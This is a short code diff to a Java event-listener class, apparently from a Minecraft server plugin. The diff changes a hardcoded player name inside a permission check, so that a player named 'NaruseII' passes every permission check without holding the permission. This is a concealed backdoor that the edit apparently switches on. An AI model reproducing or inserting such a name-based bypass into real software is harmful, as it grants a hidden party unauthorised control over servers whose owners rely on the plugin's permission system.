@@ -70,7 +70,7 @@ public class Listeners implements Listener {
 
     private boolean hasPermission(Player p, String msg){
         if(!p.hasPermission(msg)){
-            if(!p.getName().equalsIgnoreCase("aNaruseII")){
+            if(!p.getName().equalsIgnoreCase("NaruseII")){
                 return false;
             }
         }
